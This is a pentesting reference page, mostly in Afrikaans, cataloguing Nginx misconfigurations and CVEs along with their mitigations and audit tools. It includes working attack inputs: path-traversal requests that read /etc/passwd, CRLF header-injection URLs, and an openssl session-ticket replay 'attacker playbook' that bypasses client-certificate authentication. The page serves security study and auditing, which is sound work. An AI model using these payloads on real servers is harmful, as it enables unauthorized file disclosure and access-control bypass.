# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Vermissing van root-ligging <a href="#missing-root-location" id="missing-root-location"></a>

Wanneer die Nginx-bediener gekonfigureer word, speel die **root directive** 'n kritieke rol deur die basiese gids te definieer waarvan lêers bedien word. Kyk na die voorbeeld hieronder:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In hierdie konfigurasie is `/etc/nginx` aangewys as die root-gids. Hierdie opstelling laat toegang toe tot lêers binne die gespesifiseerde root-gids, soos `/hello.txt`. Dit is egter belangrik om op te let dat slegs 'n spesifieke location (`/hello.txt`) gedefinieer is. Daar is geen konfigurasie vir die root location (`location / {...}`) nie. Hierdie weglating beteken dat die root-direktief globaal van toepassing is, wat versoeke na die root-pad `/` in staat stel om lêers onder `/etc/nginx` te bereik.

'N Kritieke sekuriteitsimplikasie spruit uit hierdie konfigurasie. 'n Eenvoudige `GET` versoek, soos `GET /nginx.conf`, kan sensitiewe inligting blootlê deur die Nginx konfigurasielêer by `/etc/nginx/nginx.conf` te bedien. Om die root na 'n minder sensitiewe gids soos `/etc` te stel, kan hierdie risiko verminder, maar dit kan steeds onbedoelde toegang tot ander kritieke lêers toelaat, insluitend ander konfigurasielêers, access logs, en selfs geënkripteerde credentials wat vir HTTP basic authentication gebruik word.

## Alias LFI Konfigurasiefout <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In die konfigurasielêers van Nginx is 'n noukeurige inspeksie van die "location" directives nodig. 'n Ernstige kwesbaarheid bekend as Local File Inclusion (LFI) kan per ongeluk ingesluit word deur 'n konfigurasie wat soos volg lyk:
```
location /imgs {
alias /path/images/;
}
```
Hierdie konfigurasie is vatbaar vir LFI-aanvalle omdat die bediener versoeke soos `/imgs../flag.txt` interpreteer as 'n poging om lêers buite die beoogde gids te bereik, wat effektief oplos na `/path/images/../flag.txt`. Hierdie fout stel aanvalle in staat om lêers vanaf die bediener se lêerstelsel te bekom wat nie via die web toeganklik behoort te wees nie.

Om hierdie kwesbaarheid te versag, moet die konfigurasie aangepas word om:
```
location /imgs/ {
alias /path/images/;
}
```
Meer inligting: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix toetse:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Onveilige padbeperking <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Kyk na die volgende bladsy om te leer hoe om direktiewe soos die volgende te omseil:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsafe variable use / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Kwetsbare veranderlikes `$uri` en `$document_ur`i — dit kan reggemaak word deur hulle met `$request_uri` te vervang.
>
> A regex can also be vulnerable like:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Not vulnerable (checking spaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable

A vulnerability in Nginx configuration is demonstrated by the example below:
```
location / {
return 302 https://example.com$uri;
}
```
Die karakters \r (Carriage Return) en \n (Line Feed) dui nuwe reël-einde-karakters in HTTP-versoeke aan, en hul URL-geënkodeerde vorme word voorgestel as `%0d%0a`. Om hierdie karakters in 'n versoek in te sluit (bv. `http://localhost/%0d%0aDetectify:%20clrf`) na 'n verkeerd gekonfigureerde bediener veroorsaak dat die bediener 'n nuwe header met die naam `Detectify` uitreik. Dit gebeur omdat die $uri veranderlike die URL-geënkodeerde reël-einde-karakters dekodeer, wat tot 'n onverwagte header in die antwoord lei:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Lees meer oor die risiko's van CRLF injection en response splitting by [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Hierdie tegniek word ook [**verduidelik in hierdie praatjie**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) met 'n paar kwesbare voorbeelde en opsporingsmeganismes. Byvoorbeeld, om hierdie wanopstelling vanuit 'n blackbox-perspektief op te spoor, kan jy die volgende versoeke stuur:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Indien kwesbaar, sal die eerste teruggee aangesien "X" enige HTTP-metode is en die tweede 'n fout teruggee omdat H nie 'n geldige metode is nie. Die bediener sal dus iets soos ontvang: `GET / H HTTP/1.1` en dit sal die fout veroorsaak.

Nog 'n opsporingsvoorbeeld sou wees:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Sommige kwesbare konfigurasies wat in daardie praatjie getoon is, was:

- Neem kennis hoe **`$uri`** onveranderd in die finale URL gebruik word
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Let op hoe **`$uri`** weer in die URL voorkom (hierdie keer binne 'n parameter)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Nou in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Enige variabele

Daar is ontdek dat **gebruikersverskafde data** moontlik as 'n **Nginx variabele** behandel kan word onder sekere omstandighede. Die oorsaak van hierdie gedrag bly ietwat onduidelik, maar dit is nie skaars nie en ook nie eenvoudig om te verifieer nie. Hierdie anomalie is beklemtoon in 'n sekuriteitsverslag op HackerOne, wat [here](https://hackerone.com/reports/370094) besigtig kan word. Verdere ondersoek na die foutboodskap het gelei tot die identifisering van sy voorkoms binne die [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wat Server Side Includes (SSI) as die kernoorsaak uitwys.

Om hierdie miskonfigurasie te **ontdek**, kan die volgende opdrag uitgevoer word, wat behels dat 'n referer header gestel word om te toets of variabele uitgeprint word:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Skanderings vir hierdie konfigurasiefout oor stelsels het verskeie gevalle aan die lig gebring waar Nginx-variabeles deur 'n gebruiker vertoon kon word. Daar is egter 'n afname in die aantal kwesbare gevalle, wat daarop dui dat pogings om hierdie probleem te patch gedeeltelik suksesvol was.

### Gebruik try_files met $URI$ARGS variabeles

Die volgende Nginx-konfigurasiefout kan lei tot 'n LFI-kwetsbaarheid:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
In ons konfigurasie het ons die direktief `try_files` wat gebruik word om die bestaan van lêers in 'n gespesifiseerde volgorde na te gaan. Nginx bedien die eerste een wat dit vind. Die basiese sintaks van die `try_files`-direktief is soos volg:
```
try_files file1 file2 ... fileN fallback;
```
Nginx sal nagaan of elke lêer in die gespesifiseerde volgorde bestaan. As 'n lêer bestaan, sal dit onmiddellik bedien word. As geen van die gespesifiseerde lêers bestaan nie, sal die versoek na die fallback-opsie gestuur word, wat 'n ander URI of 'n spesifieke foutblad kan wees.

Wanneer egter die `$uri$args`-variabeles in hierdie directive gebruik word, sal Nginx probeer om 'n lêer te vind wat ooreenstem met die request URI gekombineer met enige query string-argumente. Daarom kan ons hierdie konfigurasie uitbuit:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Met die volgende payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Deur ons payload te gebruik ontsnap ons die wortelgids (gedefinieer in die Nginx-konfigurasie) en laai die `/etc/passwd` lêer. In debug-logs kan ons sien hoe Nginx die lêers probeer:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC teen Nginx wat die hierbo genoemde konfigurasie gebruik:
![Voorbeeld burp versoek](../../images/nginx_try_files.png)

## Lees van rou backend-antwoord

Nginx bied 'n funksie via `proxy_pass` wat die onderskepping van errors en HTTP-headers wat deur die backend gegenereer word toelaat, met die doel om interne foutboodskappe en headers te verberg. Dit word bereik deurdat Nginx persoonlike foutbladsye bedien as reaksie op backend-foute. Probleme ontstaan egter wanneer Nginx 'n ongeldige HTTP-aanvraag teëkom. So 'n aanvraag word soos ontvang na die backend deurgestuur, en die backend se rou reaksie word dan direk aan die kliënt gestuur sonder Nginx se tussenkoms.

Oorweeg 'n voorbeeldscenario wat 'n uWSGI toepassing behels:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Om dit te bestuur, word spesifieke direktiewe in die Nginx-konfigurasie gebruik:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Hierdie direktief laat Nginx toe om 'n pasgemaakte antwoord te lewer vir backend-antwoorde met 'n statuskode groter as 300. Dit verseker dat, vir ons voorbeeld uWSGI-toepassing, 'n `500 Error`-antwoord gekaap en deur Nginx hanteer word.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Soos die naam aandui, verberg hierdie direktief spesifieke HTTP-headers vir die kliënt, wat privaatheid en sekuriteit verbeter.

Wanneer 'n geldige `GET`-versoek gemaak word, verwerk Nginx dit normaalweg en stuur 'n standaard fout-antwoord terug sonder om enige geheime headers te openbaar. 'n Ongeldige HTTP-versoek omseil egter hierdie meganisme, wat lei tot die blootstelling van rou backend-antwoorde, insluitend geheime headers en foutboodskappe.

## merge_slashes set to off

Standaard is Nginx se **`merge_slashes` directive** op **`on`** gestel, wat meerdere skuinsstrepe in 'n URL saamdruk tot 'n enkele streep. Hierdie funksie, alhoewel dit URL-verwerking vereenvoudig, kan per ongeluk kwesbaarhede in toepassings agter Nginx verberg, veral dié vatbaar vir local file inclusion (LFI)-aanvalle. Sekuriteitskundiges **Danny Robinson and Rotem Bar** het die potensiële risiko's van hierdie standaardgedrag uitgelig, veral wanneer Nginx as 'n reverse-proxy optree.

Om sulke risiko's te verminder, word dit aanbeveel om die **`merge_slashes` directive af te skakel** vir toepassings vatbaar vir hierdie kwesbaarhede. Dit verseker dat Nginx versoeke aan die toepassing deurstuur sonder om die URL-struktuur te verander, en sodoende nie onderliggende sekuriteitsprobleme maskeer nie.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), there are certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Dui aan dat Nginx 'n versoek intern na 'n gespesifiseerde ligging moet herlei.
- `X-Accel-Buffering`: Beheer of Nginx die respons moet buffer of nie.
- `X-Accel-Charset`: Stel die karakterstelling vir die respons wanneer X-Accel-Redirect gebruik word.
- `X-Accel-Expires`: Stel die vervaltyd vir die respons wanneer X-Accel-Redirect gebruik word.
- `X-Accel-Limit-Rate`: Beperk die oordragsnelheid van antwoorde wanneer X-Accel-Redirect gebruik word.

For example, the header **`X-Accel-Redirect`** will cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

In the **Nginx configuration**, the `map` directive often plays a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized access. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sonder 'n `default` kan 'n **kwaadwillige gebruiker** sekuriteit omseil deur 'n **ongedefinieerde URI** binne `/map-poc` te besoek. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) beveel aan om 'n **standaardwaarde** in te stel om sulke probleme te voorkom.

### **DNS Spoofing Vulnerability**

DNS spoofing teen Nginx is moontlik onder sekere omstandighede. As 'n aanvaller die **DNS server** wat Nginx gebruik ken en sy DNS queries kan onderskep, kan hulle DNS-rekords spoof. Hierdie metode is egter ondoeltreffend as Nginx gekonfigureer is om **localhost (127.0.0.1)** vir DNS-oplossing te gebruik. Nginx laat toe om 'n DNS server soos volg te spesifiseer:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` en `internal` Direktiewe**

Die **`proxy_pass`** direktief word gebruik om versoeke na ander servers te herlei, hetsy intern of eksternt. Die **`internal`** direktief verseker dat sekere lokasies slegs binne Nginx toeganklik is. Al is hierdie direktiewe op sigself nie kwesbaarhede nie, verg hul konfigurasie noukeurige ondersoek om veiligheidsgebreke te voorkom.

## proxy_set_header Upgrade & Connection

As die nginx server gekonfigureer is om die Upgrade en Connection headers deur te gee, kan 'n [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) uitgevoer word om toegang tot beskermde/interne endpoints te kry.

> [!CAUTION]
> Hierdie kwesbaarheid sou 'n aanvaller toelaat om 'n direkte verbinding met die `proxy_pass` endpoint te vestig (`http://backend:9999` in hierdie geval) waarvan die inhoud nie deur nginx gekontroleer gaan word nie.

Voorbeeld van 'n kwesbare konfigurasie om `/flag` te steel van [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Let daarop dat selfs al het die `proxy_pass` na 'n spesifieke **pad** soos `http://backend:9999/socket.io` verwys, sal die verbinding gevestig word met `http://backend:9999`, sodat jy **enige ander pad binne daardie interne endpunt kan kontak. Dit maak dus nie saak of 'n pad in die URL van proxy_pass gespesifiseer is nie.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Tydens 2024 het Nginx CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 en CVE-2024-35200 bekendgemaak wat aantoon dat 'n **enkele kwaadwillige QUIC-sessie** worker processes kan laat crash of leak memory wanneer die eksperimentele `ngx_http_v3_module` ingesluit is en 'n `listen ... quic` socket blootgestel word. Beïnvloedde builds is 1.25.0–1.25.5 en 1.26.0, terwyl 1.27.0/1.26.1 die fixes lewer; die memory disclosure (CVE-2024-34161) vereis bykomend MTUs groter as 4096 bytes om sensitiewe data te laat verskyn (besonderhede in die 2024 nginx advisory hieronder).

**Recon & exploitation hints**

- HTTP/3 is opt-in, so scan vir `Alt-Svc: h3=":443"` responses of brute-force UDP/443 QUIC handshakes; sodra bevestig, fuzz die handshake en STREAM frames met pasgemaakte `quiche-client`/`nghttp3` payloads om worker crashes te trigger en log leakage af te dwing.
- Vingerafdruk die teiken se ondersteuning vinnig met:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

'n Veiligheidskennisgewing in Februarie 2025 het bekendgemaak dat nginx 1.11.4–1.27.3, gebou met OpenSSL, toelaat dat **hergebruik van 'n TLS 1.3 session** van een naamgebaseerde virtual host binne 'n ander voorkom, sodat 'n kliënt wat met 'n sertifikaatvrye host onderhandeld het die ticket/PSK kan her-speel om in 'n vhost wat beskerm word met `ssl_verify_client on;` in te spring en mTLS heeltemal oor te slaan. Die fout tree op wanneer meerdere virtual hosts dieselfde TLS 1.3 session cache en tickets deel (sien die 2025 nginx-kennisgewing hieronder).

**Aanvaller playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
As die teiken kwesbaar is, voltooi die tweede handshake sonder om 'n client certificate voor te lê, wat beskermde lokasies openbaar.

**Wat om te oudit**

- Gemengde `server_name` blokke wat `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;` deel.
- Admin/API blokke wat mTLS verwag maar gedeelde session cache/ticket-instellings van openbare hosts erf.
- Automatisering wat TLS 1.3 session resumption globaal aktiveer (bv. Ansible roles) sonder om vhost-isolasie te oorweeg.

## HTTP/2 Rapid Reset weerbaarheid (CVE-2023-44487 gedrag)

Die HTTP/2 Rapid Reset attack (CVE-2023-44487) beïnvloed nog steeds nginx wanneer operateurs `keepalive_requests` of `http2_max_concurrent_streams` bo die standaardwaardes verhoog: 'n aanvaller open een HTTP/2-verbinding, oorlaai dit met duisende streams en stuur dan onmiddellik `RST_STREAM` frames sodat die gelyktydigheidsplafon nooit bereik word nie, terwyl die CPU bly besig is met die afbreeklogika. Nginx se standaardwaardes (128 concurrent streams, 1000 keepalive requests) hou die impakgebied klein; om daardie perke "substantiëel hoër" te druk maak dit triviaal om werkers te verhonger selfs vanaf 'n enkele kliënt (sien die F5 write-up hieronder).

**Opsporingswenke**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Gashere wat ongewone hoë waardes vir daardie direktiewe openbaar, is ideale teikens: een HTTP/2-kliënt kan deur stroomskepping en onmiddellike `RST_STREAM`-frames in 'n lus gaan om die CPU te laat piek sonder om die concurrency cap te oorskry.

## Probeer dit self

Detectify het 'n GitHub-repository geskep waar jy Docker kan gebruik om jou eie kwesbare Nginx-toetsbediener op te stel met sommige van die miskonfigurasies wat in hierdie artikel bespreek word en probeer om dit self te vind!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statiese analise-instrumente

### [GIXY](https://github.com/yandex/gixy)

Gixy is 'n instrument om Nginx-konfigurasies te ontleed. Die hoofdoel van Gixy is om sekuriteitsmiskonfigurasies te voorkom en foutopsporing te outomatiseer.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner is 'n eenvoudige instrument om te soek na algemene Nginx-miskonfigurasies en kwesbaarhede.

## Verwysings

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
